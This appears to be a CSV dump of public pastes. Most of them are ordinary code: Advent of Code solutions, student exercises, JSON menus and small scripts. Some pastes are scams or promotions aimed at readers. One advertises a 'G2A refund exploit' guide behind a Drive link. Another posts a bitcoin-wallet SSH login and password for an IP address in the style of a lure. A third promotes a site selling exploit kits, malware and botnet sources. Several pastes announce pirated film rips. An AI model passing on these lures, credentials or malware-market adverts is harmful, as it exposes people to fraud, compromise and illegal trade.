id,title,username,language,date,content
icqbhZGG,data788,TestGuy1,JSON,Wednesday 20th of December 2023 06:00:10 AM CDT,"{
  status: 'Success',
  method: 'server',
  maindata: '2734567198d32241626a3158ea97d41aeed6d92688192d7d2be9d503951c064cdbf98fd629996739ea2ca0386c83b1c8dcf1c0d4c0ecb2dab69335fa5864fec0493e9b740ed8834642e9c3ad01f324deb4e5a9079fdd0cb0e6a8f2809b3247ce874eb19bb5cd5538784d8d0831f9f16f707097029d47b320c911afcc30a18f16',
  otherdata: [
    'b16dfdff2eaf9fdc5738bef465c0c695',
    '71d363ed6c16cfaf5aec27749ebf7fb0',
    '4293014a936d7c1b0e57ba8590a3c055',
    '49dd5c47e7eeab897e73b607eb093ca0',
    '0a7cd020bc8623ae6405f5afc0d2dcbc',
    '8dedba2dce4723c1e8f5563410b854aa',
    'eb0b8ac672db09b19a2227ca96ab0a37',
    'f00be01927212b4f9d225e424e2098c9'
  ]
}"
sHgSPNnx,Untitled,TakePen,AutoIt,Wednesday 20th of December 2023 05:59:28 AM CDT,"For $i = 1 To $afWAYPOINTS_MissingDaughter_WayToFarm[0][0]
		OutLn(""Running to farm #"" & $i)
        _MissingDaughter_MoveAndFlag($afWAYPOINTS_MissingDaughter_WayToFarm[$i][0], _
                                        $afWAYPOINTS_MissingDaughter_WayToFarm[$i][1], _
                                        _MissingDaughter_MoveToCallback_Speedboost)
        If _Agent_IsDead($g_mPlayer) Then Return False
        If $g_bStopRun Then Return False
    Next"
sQ9RW0r0,Soal W14 - 2,ChaeYuriya,Go,Wednesday 20th of December 2023 05:57:28 AM CDT,"package main

import ""fmt""

func main() {
	var num int
	fmt.Scan(&num)
	for i := 1; i <= num; i++ {
		for j := num; j > 0; j-- {
			fmt.Print(j)
		}
		fmt.Print(""\n"")
	}
}"
4xu6LiRi,t3,pb_jiang,C++,Wednesday 20th of December 2023 05:45:46 AM CDT,"#include <assert.h>
#include <bits/stdc++.h>
using namespace std;

bool is_square(const vector<vector<int>> &g, int r, int c, int len)
{
    if (r - len < 0 || c - len < 0)
        return false;
    for (int i = r; i >= r - len; --i)
        if (g[i][c] == 0 || g[i][c - len] == 0)
            return false;
    for (int i = c; i >= c - len; --i)
        if (g[r][i] == 0 || g[r - len][i] == 0)
            return false;
    return true;
}

int main(int argc, char **argv)
{
    int n, m;
    cin >> n >> m;
    vector<vector<int>> g(n, vector<int>(m));
    for (int i = 0; i < n; ++i)
        for (int j = 0; j < m; ++j)
            cin >> g[i][j];
    int ans_r, ans_c, ans_w = 0;
    for (int i = 0; i < n; ++i)
        for (int j = 0; j < m; ++j) {
            int max_d = min(i, j);
            while (max_d >= ans_w) {
                if (is_square(g, i, j, max_d))
                    ans_w = max_d + 1, ans_r = i, ans_c = j;
                max_d--;
            }
        }
    cout << ans_r << ' ' << ans_c << ' ' << ans_w << endl;
    return 0;
};
"
VV0Vmdwv,Lost4Dead.ru A Free-VIP For One Year,winn1337,C++,Wednesday 20th of December 2023 05:45:19 AM CDT,"[RUS]: Как получить бесплатный вип?

- Вы должны: написать где-нибудь ( на сервере в чате ( даже если там нет меня (Win), Я увижу историю чата и потом поставлю ); на сайте в чате, не важно где ... ), что Вы хотите получить бесплатный ВИП. Далее - Вы его получаете, РОВНО на один год, бесплатно.

Условие получения VIP и остальное:

1) Вы должны играть на сервере на протяжении всего года ( хотя-бы - раз в полмесяца-месяц, по полтора-два часа ). Если Вы не сможете играть хотя-бы по этому условию - советуем его приобрести на месяц, за 250 рублей;

2) Если Вы не заходили на сервер два и более месяца - Администрация снимет с Вас VIP, и больше его не даст за бесплатно.

Данное предложение будет активно до 1-ого января, 2024-ого года. Количество мест - не ограниченно.

/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
 
[ENG]: How to get a Free-VIP?
 
- You need to: write somewhere ( in the server's chat ( even if me (Win) are not in the server, at this moment ); or in the site, it's doesn't matter ... ) that you wanna get a free-VIP. After this, You'll became a new VIP, for one year.

The Conditions and the other things that needs to know before asking for the free-vip:

1) You need to be more activity and play in this server ( at least - 2-3 games per a half of one month / one month );

2) If you will be inactive in this server for 2 months or more - your VIP will be removed and you never can't get a free-vip again.

This offer will be active from this moment to 1-st of January, 2024. Free VIP-Places - no limit."
KGFYeqnP,Soal W14 - 1,ChaeYuriya,Go,Wednesday 20th of December 2023 05:42:23 AM CDT,"package main

import ""fmt""

func main() {
	var num int
	fmt.Scan(&num)
	for i := 1; i <= num; i++ {
		for j := 1; j <= num; j++ {
			fmt.Print(j)
		}
		fmt.Print(""\n"")
	}
}
"
NALGaFvY,G2A Refund Exploit Dec 2023,G2ARefundExploit,GetText,Wednesday 20th of December 2023 05:35:42 AM CDT,"G2A refund exploit updated guide - any item for free on G2A.com

https://drive.google.com/file/d/1AKxSk9vs38aBF7GEDJxf8mNi-_NVRLQ9/view#g2a_refund_exploit.pdf

Working as of 
13 December 2023

138524"
1ucCkTCu,Sophie.Scholl.2005.Deu.DVDRip.mpeg.ac3.Subs-bp,bpmircea,BrainFuck,Wednesday 20th of December 2023 05:34:36 AM CDT,"Sophie Scholl - Die letzten Tage (Sophie Scholl: The Final Days) (Marc Rothemund, 2005)
aka
Sophie.Scholl.2005.Deu.DVDRip.mpeg.ac3.Subs-bp
https://www.imdb.com/title/tt0426578/

Uploading..."
kPdSzau1,Untitled,Kaban4ik,Java,Wednesday 20th of December 2023 05:20:48 AM CDT,"public class A {
    private int a = 14;
    public void a() {
        a++;
        System.out.println(a);
    }
}
 
public class B {
    private int b;
    public void b(A a) {
        a.a();
        b++;
        System.out.println(b);
    }
 
    public static void main(String[] args) {
        A a1 = new A();
        A a2 = new A();
        B b = new B();

        a1.a();  
        a2.a();  
        b.b(a1); 

        a1.a(); 
        a2.a(); 
    }
}"
LBwa8g6R,Sophie.Scholl.2005.Deu.DVDRip.mpeg.mp3.Subs-bp,bpmircea,BrainFuck,Wednesday 20th of December 2023 05:14:24 AM CDT,"Sophie Scholl - Die letzten Tage (Sophie Scholl: The Final Days) (Marc Rothemund, 2005)
aka
Sophie.Scholl.2005.Deu.DVDRip.mpeg.mp3.Subs-bp
https://www.imdb.com/title/tt0426578/

Uploading..."
k49pYeJG,Untitled,Kaban4ik,Java,Wednesday 20th of December 2023 04:44:39 AM CDT,"@FunctionalInterface
public interface FunctionalInterface {
    void method();
}

class Main {

	private static final int z = 50;

	public static void main(string... args) {
        int x = 10;
        FunctionalInterface ff
                = () -> System.out.println(""Value of x : "" + x);
        ff.method();

        
        ff.method();


        int y = 30;
        ff = () -> System.out.println(""Value of y : "" + y);
        ff.method();

        ff = () -> System.out.println(""Value of z : "" + z);
        ff.method();
	}
}"
srE6LNgi,Google Ads Purchase Code,Jawad_Khan,JavaScript,Wednesday 20th of December 2023 04:34:11 AM CDT,"  <script>
    gtag(""event"", ""purchase"", {
        transaction_id: ""T_12345_1"",
        affiliation: ""Google Merchandise Store"",
        value: 25.42,
        tax: 4.90,
        shipping: 5.99,
        currency: ""USD"",
        coupon: ""SUMMER_SALE"",
        items: [
        // If someone purchases more than one item,
        // you can add those items to the items array
         {
          item_id: ""SKU_12345"",
          item_name: ""Stan and Friends Tee"",
          affiliation: ""Google Merchandise Store"",
          coupon: ""SUMMER_FUN"",
          discount: 2.22,
          index: 0,
          item_brand: ""Google"",
          item_category: ""Apparel"",
          item_category2: ""Adult"",
          item_category3: ""Shirts"",
          item_category4: ""Crew"",
          item_category5: ""Short sleeve"",
          item_list_id: ""related_products"",
          item_list_name: ""Related Products"",
          item_variant: ""green"",
          location_id: ""ChIJIQBpAG2ahYAR_6128GcTUEo"",
          price: 9.99,
          quantity: 1
        }]
    });
    </script>"
id1599WX,# 512x512_rgb_gradient_ctrl_3.py,here2share,Python,Wednesday 20th of December 2023 04:29:51 AM CDT,"# 512x512_rgb_gradient_ctrl_3.py

import tkinter as tk
import random
from PIL import Image, ImageTk, ImageFilter

ww = 512
hh = 512

root = tk.Tk()
root.title(""512x512_rgb_gradient_ctrl"")
root.geometry(""%dx%d+%d+%d"" %(ww, hh, 10, 10))

canvas = tk.Canvas(root, width=ww, height=hh)
canvas.pack()

def generate(event=None):
	for size in layers:
		interpolate(size)
	draw()

def interpolate(size):
	img = Image.new(""RGBA"", (size, size))
	pixels = img.load()
	for y in range(size):
		for x in range(size):
			red = random.randint(0, 255)
			green = random.randint(0, 255)
			blue = random.randint(0, 255)
			pixels[x, y] = (red, green, blue, 255)
	img = img.resize((ww, hh))
	layers[size] = img

def draw(event=None):
	buffer = Image.new(""RGBA"", (ww, hh), (255, 255, 255, 255))
	for size, layer_image in layers.items():
		if size != 4:
			alpha = float(opacity_slider[size].get()) / 2056.0
		else:
			alpha = 1
		buffer = Image.blend(buffer, layer_image, alpha)
	
	contour_layer = buffer.point(lambda x: 0 if x % 30 < 15 else 255)
	buffer = Image.blend(buffer, contour_layer, 0.05)
	
	photo = ImageTk.PhotoImage(buffer)
	canvas.create_image(0, 0, anchor=tk.NW, image=photo)
	canvas.image = photo

opacity_label = tk.Toplevel(root)
opacity_title = tk.Label(opacity_label, text=""Press Spacebar To Randomize"")
opacity_title.pack()
opacity_slider = {}
layers = {}

size = 4
interpolate(size)
while size + 6 < 32:
	size += 7
	opacity_slider[size] = tk.Scale(opacity_label, from_=512, to=0, orient=tk.VERTICAL, label=size, command=draw)
	opacity_slider[size].pack(side=tk.LEFT, fill='both', expand=True)
	opacity_slider[size].set(5)
	interpolate(size)

canvas.update()
t = opacity_label.winfo_width()
opacity_label.geometry(""%dx300+%d+%d"" %(t, 50, 50))
for t in (root, opacity_label):
	t.bind(""<space>"", generate)
opacity_label.wm_transient(root)

draw()
root.mainloop()"
amxap93P,BTC Wallet Credentials have been reset,VQ-Moe,GetText,Wednesday 20th of December 2023 04:23:23 AM CDT,"Dear Moe,
We have received a request to reset the login information for your Bitcoin wallet. If you did not make this request, please contact us immediately.

Your new login credentials will be 
chefman440:Jmh3x9ZB on 149.28.231.183
You can connect via SSH.

Regards,
GM-583495"
WFhW59qR,x1337,hulk4201,GetText,Wednesday 20th of December 2023 04:18:57 AM CDT,"██╗  ██╗ ██╗██████╗ ██████╗ ███████╗    ██╗  ██╗██╗   ██╗██████╗ 
╚██╗██╔╝███║╚════██╗╚════██╗╚════██║    ██║  ██║██║   ██║██╔══██╗
 ╚███╔╝ ╚██║ █████╔╝ █████╔╝    ██╔╝    ███████║██║   ██║██████╔╝
 ██╔██╗  ██║ ╚═══██╗ ╚═══██╗   ██╔╝     ██╔══██║██║   ██║██╔══██╗
██╔╝ ██╗ ██║██████╔╝██████╔╝   ██║      ██║  ██║╚██████╔╝██████╔╝
╚═╝  ╚═╝ ╚═╝╚═════╝ ╚═════╝    ╚═╝      ╚═╝  ╚═╝ ╚═════╝ ╚═════╝ 
                                                                 
								[ https://x1337.pw ]
	Leakedfiles is an archive based website that holds many diffrent files such as, exploit kits, Malware/warez, botnet sources, 0days, exploits, scanners, databases, system tools, networking, dstating, sentryMBA configs, skype deob 7 + MORE! Check us out @ https://t.me/x1337hub


________________[ Tags Ignore ]________________
botnet, mirai botnet, mirai, qbot, kaiten, kaitenSTD, hackforums, leak.sx, leakforums, youtube, archive, twitter, facebook, tutorials, malware, warez, exploitkits, 0days, RCE, PoC, sqli, news, krebs, microsoft, google, software, weather, g, calculator, youtube to mp3, dictionary, translator, movies, speed test, cheap flights, maps, unblocked games, restaurants, social security, cars, happy birthday, quotes, ga lottery, pa lottery, youtube converter, cloudflare, crimeflare, reverse phone lookup, doxing methods, doxing, keemstar, pizza, school closings, cloudflare resolver, skype resolver, skyperesolver, skype ip resolver, skype resolve, resolver skype, skresolver, ip to skype, email to skype, skype to ip, skype to lan, resolver,Skypegrab,best,skype,resolver,2015,ip2skype,hackforums,leakforums,hacking,hacker,hack,ddos,bypass resolver,db lookup skype resolver, free skype resolver, webbased resolver, hackforums, blacklist, skype,speedresolve, hacking, hacker, skype resolver,  skype, beta resolver,  beta, skype2ip,  ip2skype,  hackforums,  leak,  resolveme,  free skype resolver, free resolver, hanzresolver, hanz resolver, hanzresolver resolver, skype beta resolver, bypass skype beta, skype beta, ip resolver, skype ip, resolver ip skype, skype resolver free, skype to ip, leak sx,  leak.sx, skype resolver beta, skype2email, email2skype, Exploits, Dstat, Skype Deob 7"
EU0c7Cqk,Advent of Code 2023 - Day 20,mgla,C#,Wednesday 20th of December 2023 04:14:01 AM CDT,"var input = File.ReadAllLines(""input.txt"");

var modules = new Dictionary<string, IModule>();

foreach (var line in input)
{
    var split = line.Split("" -> "");
    var name = split[0];
    var targets = split[1].Split(',', StringSplitOptions.RemoveEmptyEntries | StringSplitOptions.TrimEntries).ToList();

    if (name == ""broadcaster"")
    {
        modules[name] = new Broadcaster(name, targets);
    }
    else if (name.StartsWith('%'))
    {
        modules[name[1..]] = new FlipFlop(name[1..], targets);
    }
    else if (name.StartsWith('&'))
    {
        modules[name[1..]] = new Conjunction(name[1..], targets);
    }
}

foreach (var module in modules.Values)
{
    if (module is not Conjunction conjunction) continue;

    var inputs = modules.Values.Where(m => m.Targets.ContainsKey(module.Name)).ToList();
    foreach (var inputModule in inputs)
    {
        conjunction.Inputs[inputModule.Name] = PulseType.Low;
    }
}

var lowPulses = 0;
var highPulses = 0;
var queue = new Queue<(IModule Module, PulseType PulseType)>();
var currentPulse = PulseType.Low;
var count = 0;

// The module that sends pulses to rx - it's a conjunction.
// In order to send a low pulse to rx, all of its inputs must be sending a high pulse.
var rxSource = modules.Values.First(m => m.Targets.ContainsKey(""rx""));

// The modules that send pulses to the conjunction that sends pulses to rx.
var rxSourceInputs = modules.Values.Where(m => m.Targets.ContainsKey(rxSource.Name)).ToList();

// We will count how many pushes are needed for each module to send out a high pulse.
var rxSourceInputCounts = new Dictionary<string, (int Count, bool Done)>(); 
foreach (var rxSourceModule in rxSourceInputs)
{
    rxSourceInputCounts[rxSourceModule.Name] = (0, false);
}

while (true)
{
    if (count == 1000)
    {
        Console.WriteLine($""Part 1: {lowPulses * highPulses}"");
    }

    count++;

    queue.Enqueue((modules[""broadcaster""], currentPulse));

    if (currentPulse == PulseType.Low)
    {
        lowPulses++;
    }
    else
    {
        highPulses++;
    }

    if (rxSourceInputCounts.All(rxs => rxs.Value.Done))
    {
        // We know that all of the inputs to the conjunction that sends pulses to rx have sent out a high pulse.
        // Now we just find the LCM of the counts for each input in order to find the first time that all of the inputs
        // have sent out a high pulse, which in turn would cause rx to receive a low pulse.
        Console.WriteLine($""Part 2: {Lcm(rxSourceInputCounts.Select(rxs => rxs.Value.Count).ToArray())}"");
        break;
    }

    while (queue.TryDequeue(out var current))
    {
        current.Module.Process(current.PulseType);

        foreach (var target in current.Module.Targets.Keys)
        {
            var targetPulse = current.Module.Targets[target];

            if (target == ""rx"")
            {
                if (current.Module is not Conjunction conjunction) continue;

                var highInputs = conjunction.Inputs.Where(conjunctionInput => conjunctionInput.Value == PulseType.High);
                foreach (var conjunctionInput in highInputs)
                {
                    // The module is sending a high pulse to rx, so store its count.
                    rxSourceInputCounts[conjunctionInput.Key] = (count, true); 
                }
            }

            switch (targetPulse)
            {
                case PulseType.Low:
                    lowPulses++;
                    break;
                case PulseType.High:
                    highPulses++;
                    break;
                case PulseType.None:
                default:
                    break;
            }

            if (targetPulse != PulseType.None)
            {
                if (!modules.ContainsKey(target))
                {
                    continue;
                }

                if (modules[target] is Conjunction conjunction)
                {
                    conjunction.Inputs[current.Module.Name] = targetPulse;
                }

                queue.Enqueue((modules[target], targetPulse));
            }

            if (queue.Count == 0)
            {
                currentPulse = current.PulseType == PulseType.Low ? PulseType.High : PulseType.Low;
            }
        }
    }
}

return;

static long Lcm(IEnumerable<int> numbers) => numbers.Select(Convert.ToInt64).Aggregate((a, b) => a * b / Gcd(a, b));

static long Gcd(long a, long b) => b == 0 ? a : Gcd(b, a % b);

internal interface IModule
{
    string Name { get; set; }
    Dictionary<string, PulseType> Targets { get; set; }
    void Process(PulseType pulse);
}

internal class Broadcaster : IModule
{
    public Broadcaster(string name, List<string> targets)
    {
        Name = name;

        foreach (var target in targets)
        {
            Targets[target] = PulseType.Low;
        }
    }

    public string Name { get; set; }
    public Dictionary<string, PulseType> Targets { get; set; } = new();

    public virtual void Process(PulseType pulse)
    {
        foreach (var name in Targets.Keys)
        {
            Targets[name] = pulse;
        }
    }
}

internal class FlipFlop(string name, List<string> targets) : Broadcaster(name, targets)
{
    public bool PoweredOn { get; set; }

    public override void Process(PulseType pulse)
    {
        var output = PulseType.None;

        if (pulse == PulseType.Low)
        {
            output = PoweredOn ? PulseType.Low : PulseType.High;
            PoweredOn = !PoweredOn;
        }

        foreach (var targetName in Targets.Keys)
        {
            Targets[targetName] = output;
        }
    }
}

internal class Conjunction(string name, List<string> targets) : Broadcaster(name, targets)
{
    public Dictionary<string, PulseType> Inputs { get; set; } = new();

    public override void Process(PulseType pulse)
    {
        foreach (var name in Targets.Keys)
        {
            Targets[name] = Inputs.Values.All(x => x == PulseType.High) ? PulseType.Low : PulseType.High;
        }
    }
}

internal enum PulseType
{
    None,
    Low,
    High
}"
xuqghq2b,Untitled,kompilainenn,Python,Wednesday 20th of December 2023 03:43:31 AM CDT,"from math import gcd


class Fraction:
    def __init__(self, *args):
        if len(args) == 2:
            self.num = args[0]
            self.denom = args[1]
            self._sokr()
        elif len(args) == 1:
            self.num = int(args[0][:args[0].find('/')])
            self.denom = int(args[0][args[0].find('/') + 1:])
            self._sokr()

    def _sokr(self):
        gcd_res = gcd(self.num, self.denom)
        if gcd_res > 1:
            self.num = self.num // gcd_res
            self.denom = self.denom // gcd_res

    def numerator(self, num=None):
        if num is None:
            return self.num
        else:
            self.num = num
            self._sokr()

    def denominator(self, num=None):
        if num is None:
            return self.denom
        else:
            self.denom = num
            self._sokr()

    def __str__(self):
        return f'{self.num}/{self.denom}'

    def __repr__(self):
        return f'Fraction({self.num}, {self.denom})'"
D34hiXEB,Sophie.Scholl.2005.Deu.BDRip.1080p.h264.ac3.Subs-bp,bpmircea,BrainFuck,Wednesday 20th of December 2023 03:31:55 AM CDT,"Sophie Scholl - Die letzten Tage (Sophie Scholl: The Final Days) (Marc Rothemund, 2005)
aka
Sophie.Scholl.2005.Deu.BDRip.1080p.h264.ac3.Subs-bp
https://www.imdb.com/title/tt0426578/

Uploading..."
QthaBAxJ,Untitled,eiten,YAML,Wednesday 20th of December 2023 03:08:08 AM CDT,"api:
  services:
    - service: set_total_pulses
      variables:
        my_total_pulses: int
      then:
        - globals.set:
            id: total_pulses
            value: !lambda 'return my_total_pulses;'"
PZu9PqU4,json varavara,MChaos,JSON,Wednesday 20th of December 2023 02:57:18 AM CDT,"{
""Error"":"""",
""Success"":true,
""Groups"":[
{
""ParentID"":622245,
""Items"":[
{
""Ordering"":1000,
""Price"":350.00,
""ShortName"":""2 ore - Bilet intrare"",
""Weidth"":1.000,
""CpxMaxCount"":0,
""IsModifierGroup"":0,
""IsManualPrice"":0,
""DefaultModifier"":0,
""Description"":null,
""CategoryID"":0,
""SaleStatus"":1,
""MaxCount"":0,
""EnterpriseID"":0,
""Barcodes"":null,
""ForValidadte"":false,
""ParentID"":622285,
""HierarchyLevel"":1,
""SectionID"":4335,
""SaleSatus"":1,
""ExParentID"":0,
""ID"":622289,
""IconId"":0,
""TypeID"":7,
""ExciseStamps"":false,
""Name"":""2 ore - Bilet intrare"",
""Enabled"":null,
""KCal"":0,
""RestCount"":null,
""RestInformCount"":null,
""Code"":""100005897 "",
""ShowMask"":0,
""PhotoUrl"":null,
""CpxIsDefault"":0,
""IsComplex"":0
},
{
""Ordering"":1000,
""Price"":400.00,
""ShortName"":""3 ore - Bilet intrare"",
""Weidth"":1.000,
""CpxMaxCount"":0,
""IsModifierGroup"":0,
""IsManualPrice"":0,
""DefaultModifier"":0,
""Description"":null,
""CategoryID"":0,
""SaleStatus"":1,
""MaxCount"":0,
""EnterpriseID"":0,
""Barcodes"":null,
""ForValidadte"":false,
""ParentID"":622285,
""HierarchyLevel"":1,
""SectionID"":4335,
""SaleSatus"":1,
""ExParentID"":0,
""ID"":622291,
""IconId"":0,
""TypeID"":7,
""ExciseStamps"":false,
""Name"":""3 ore - Bilet intrare"",
""Enabled"":null,
""KCal"":0,
""RestCount"":null,
""RestInformCount"":null,
""Code"":""100005898 "",
""ShowMask"":0,
""PhotoUrl"":null,
""CpxIsDefault"":0,
""IsComplex"":0
},
{
""Ordering"":1000,
""Price"":500.00,
""ShortName"":""4 ore - Bilet intrare"",
""Weidth"":1.000,
""CpxMaxCount"":0,
""IsModifierGroup"":0,
""IsManualPrice"":0,
""DefaultModifier"":0,
""Description"":null,
""CategoryID"":0,
""SaleStatus"":1,
""MaxCount"":0,
""EnterpriseID"":0,
""Barcodes"":null,
""ForValidadte"":false,
""ParentID"":622285,
""HierarchyLevel"":1,
""SectionID"":4335,
""SaleSatus"":1,
""ExParentID"":0,
""ID"":622293,
""IconId"":0,
""TypeID"":7,
""ExciseStamps"":false,
""Name"":""4 ore - Bilet intrare"",
""Enabled"":null,
""KCal"":0,
""RestCount"":null,
""RestInformCount"":null,
""Code"":""100005899 "",
""ShowMask"":0,
""PhotoUrl"":null,
""CpxIsDefault"":0,
""IsComplex"":0
},
{
""Ordering"":1000,
""Price"":750.00,
""ShortName"":""VIP - Bilet intrare"",
""Weidth"":1.000,
""CpxMaxCount"":0,
""IsModifierGroup"":0,
""IsManualPrice"":0,
""DefaultModifier"":0,
""Description"":null,
""CategoryID"":0,
""SaleStatus"":1,
""MaxCount"":0,
""EnterpriseID"":0,
""Barcodes"":null,
""ForValidadte"":false,
""ParentID"":622285,
""HierarchyLevel"":1,
""SectionID"":4335,
""SaleSatus"":1,
""ExParentID"":0,
""ID"":622295,
""IconId"":0,
""TypeID"":7,
""ExciseStamps"":false,
""Name"":""VIP - Bilet intrare"",
""Enabled"":null,
""KCal"":0,
""RestCount"":null,
""RestInformCount"":null,
""Code"":""100005900 "",
""ShowMask"":0,
""PhotoUrl"":null,
""CpxIsDefault"":0,
""IsComplex"":0
},
{
""Ordering"":1000,
""Price"":400.00,
""ShortName"":""ZdN - Bilet intrare"",
""Weidth"":1.000,
""CpxMaxCount"":0,
""IsModifierGroup"":0,
""IsManualPrice"":0,
""DefaultModifier"":0,
""Description"":null,
""CategoryID"":0,
""SaleStatus"":1,
""MaxCount"":0,
""EnterpriseID"":0,
""Barcodes"":null,
""ForValidadte"":false,
""ParentID"":622285,
""HierarchyLevel"":1,
""SectionID"":4335,
""SaleSatus"":1,
""ExParentID"":0,
""ID"":622297,
""IconId"":0,
""TypeID"":7,
""ExciseStamps"":false,
""Name"":""ZdN - Bilet intrare"",
""Enabled"":null,
""KCal"":0,
""RestCount"":null,
""RestInformCount"":null,
""Code"":""100005901 "",
""ShowMask"":0,
""PhotoUrl"":null,
""CpxIsDefault"":0,
""IsComplex"":0
}
],
""ID"":622285,
""Name"":""1.0. Bilete de intrare"",
""Sections"":[
4335
],
""Groups"":null,
""Ordering"":1000,
""Enabled"":null
}
]
}"
U3gGuTPe,"AoC 2023 day 20, part 2 (Perl)",musifter,Perl,Wednesday 20th of December 2023 02:50:48 AM CDT,"#!/usr/bin/perl

use strict;
use warnings;

use feature         qw(say);
use List::Util      qw(reduce all);
use Math::Utils     qw(lcm);

my %Circ;

while (<>) {
    my ($type, $name, $out) = m#(.)(\w+) -> (.*)#;

    $name = 'broadcaster' if ($type eq 'b');

    my @out = split( /, /, $out );

    $Circ{$name}{type} = $type;
    $Circ{$name}{out}  = [@out];
    push( $Circ{$_}{in}->@*, $name )  foreach (@out);
}

# Make sure type is defined for everything to avoid warnings
$Circ{$_}{type} //= ''  foreach (keys %Circ);

# ASSUME: rx has one input, a NAND gate that collects from several NAND gates.
# Those gates should receive all high at some point on a cycle, and when they
# all line up, rx will receive a low pulse.
my %collect = map { $_ => [] } $Circ{ $Circ{rx}{in}[0] }{in}->@*;
my $presses = 0;

LOOP:
while (1) {
    # broadcaster is honourary flip-flop, always start high
    $Circ{broadcaster}{state} = 1;
    my @queue = ([0, 'broadcaster', 'button']);
    $presses++;

    PULSE:
    while (my $pulse = shift @queue) {
        my ($bit, $targ, $src) = @$pulse;

        next PULSE  if (!defined $Circ{$targ}{type});   # output from tests

        if ($Circ{$targ}{type} eq '&') {
            # NAND
            $Circ{$targ}{$src} = $bit;

            my $state = int !(reduce {$a & $b} (1, map {$Circ{$targ}{$_} // 0} $Circ{$targ}{in}->@*));
            push( $collect{$targ}->@*, $presses ) if (exists $collect{$targ} and $state);

            push( @queue, map { [$state, $_, $targ] } $Circ{$targ}{out}->@* );

        } else {
            # flip-flop or 'b'roadcast
            next PULSE if ($bit);

            my $state = $Circ{$targ}{state} = int !($Circ{$targ}{state} // 0);
            push( @queue, map { [$state, $_, $targ] } $Circ{$targ}{out}->@* );
        }
    }

    # XXX: Just getting the first appearance of each seems to give us the cycles we want.
    last LOOP  if (all { scalar $collect{$_}->@* } keys %collect);
}

say ""Sections all set at: "", join( ', ', map { $_->[0] } values %collect );
say ""Part 2: "", lcm map { $_->[0] } values %collect;"
FE4FCjWw,"AoC 2023 day 20, part 1 (Perl)",musifter,Perl,Wednesday 20th of December 2023 02:50:01 AM CDT,"#!/usr/bin/perl

use strict;
use warnings;

use feature         qw(say);
use List::Util      qw(reduce product);

# Read in circuit
my %Circ;
while (<>) {
    my ($type, $name, $out) = m#(.)(\w+) -> (.*)#;

    $name = 'broadcaster' if ($type eq 'b');

    my @out = split( /, /, $out );

    $Circ{$name}{type} = $type;
    $Circ{$name}{out}  = [@out];
    push( $Circ{$_}{in}->@*, $name )  foreach (@out);
}

my @pulses = (0, 0);        # counts of low (0) and high (1) pulses

foreach (1 .. 1000) {
    # broadcaster is honourary flip-flop, always starts high
    $Circ{broadcaster}{state} = 1;
    my @queue = ([0, 'broadcaster', 'button']);

    PULSE:
    while (my $pulse = shift @queue) {
        my ($bit, $targ, $src) = @$pulse;

        $pulses[$bit]++;
        next PULSE  if (!defined $Circ{$targ}{type});   # output only nodes

        if ($Circ{$targ}{type} eq '&') {  # NAND
            $Circ{$targ}{$src} = $bit;

            my $state = int !(reduce {$a & $b} (1, map {$Circ{$targ}{$_} // 0} $Circ{$targ}{in}->@*));
            push( @queue, map { [$state, $_, $targ] } $Circ{$targ}{out}->@* );

        } else {  # flip-flop or 'b'roadcast
            next PULSE if ($bit);

            my $state = $Circ{$targ}{state} = int !($Circ{$targ}{state} // 0);
            push( @queue, map { [$state, $_, $targ] } $Circ{$targ}{out}->@* );
        }
    }
}

say ""Pulses: "", join( ', ', @pulses );
say ""Part 1: "", product @pulses;"
30WcJhjT,Check Hostname,nobs,Bash,Wednesday 20th of December 2023 02:29:02 AM CDT,"#!/bin/bash
# prüfe Einstellungen für Hostname und Domainnamen
#
# Eintrag in /etc/hostname sollte ein FQDN sein.
# Dieser Eintrag sollte der erste Name der primären IP in 
# /etc/hosts sein.

a=$(hostname -I | cut -d ' ' -f 1)
echo    ""primäre IP:                                    $a""
echo -n ""FQDN Hostname laut /etc/hosts:                 ""
awk -v a=$a '($1 == a){print $2}' /etc/hosts
echo -n ""Domainname laut Dienstprogramm dnsdomainname:  ""
dnsdomainname
echo -n ""Hostname laut Dienstprogramm hostname:         ""
hostname
"
GHa3xbqG,Untitled,kwest87,C#,Wednesday 20th of December 2023 02:14:53 AM CDT,"[StartCode]
using System;

namespace ConsoleApp13
{
    internal class Program
    {
        static void Main(string[] args)
        {
            Random random = new Random();
            int[] numbers = new int[10];
            int maximumNumber = 10;

            for (int i = 0; i < numbers.Length; i++)
            {
                numbers[i] = random.Next(maximumNumber);
            }

            Console.Write(""Не отсортированно : "");

            for (int i = 0; i < numbers.Length; i++)
            {
                Console.Write(numbers[i] + "" "");
            }

            Console.WriteLine();
            Console.Write(""Отсортированно : "");

            for (int i = 0;i < maximumNumber; i++)
            {
                for (int j = 0; j < numbers.Length; j++)
                {
                    if (i == numbers[j])
                    {
                        Console.Write(numbers[j] + "" "");
                    }
                }
            }
        }
    }
}
[EndCode]"
rwWK3ZrT,Untitled,kwest87,C#,Wednesday 20th of December 2023 02:12:47 AM CDT,"[StartCode]
using System;

namespace ConsoleApp14
{
    internal class Program
    {
        static void Main(string[] args)
        {
            const string CommandSum = ""sum"";
            const string CommandExit = ""exit"";

            string userInput;
            int[] numbers = new int[0];
            bool isWork = true;

            while (isWork)
            {
                Console.WriteLine($""Введите команду : цифру , {CommandSum} или {CommandExit}."");
                userInput = Console.ReadLine();

                if (userInput == CommandSum)
                {
                    int sumNumber = 0;

                    for (int i = 0; i < numbers.Length; i++)
                    {
                        sumNumber += numbers[i];
                    }

                    Console.WriteLine(sumNumber);
                }
                else if (userInput == CommandExit)
                {
                    isWork = false;
                }
                else
                {
                    int[] temporaryArray = new int[numbers.Length + 1];
                    temporaryArray[numbers.Length] = Convert.ToInt32(userInput);

                    for (int i = 0; i < numbers.Length; i++)
                    {
                        temporaryArray[i] = numbers[i];
                    }

                    numbers = temporaryArray;
                }
            }
        }
    }
}
[EndCode]"
pmfLUQbz,vavaravara,MChaos,JSON,Wednesday 20th of December 2023 02:04:19 AM CDT,"{
    ""Error"": """",
    ""Success"": true,
    ""Groups"": [
        {
            ""ParentID"": 4240,
            ""Items"": [
                {
                    ""Ordering"": 1000,
                    ""Price"": 350.00,
                    ""ShortName"": ""ВЗР. 3 часа"",
                    ""Weidth"": 0.000,
                    ""CpxMaxCount"": 0,
                    ""IsModifierGroup"": 0,
                    ""IsManualPrice"": 0,
                    ""DefaultModifier"": 0,
                    ""Description"": null,
                    ""CategoryID"": 181,
                    ""SaleStatus"": 1,
                    ""MaxCount"": 0,
                    ""EnterpriseID"": 205,
                    ""Barcodes"": null,
                    ""ForValidadte"": false,
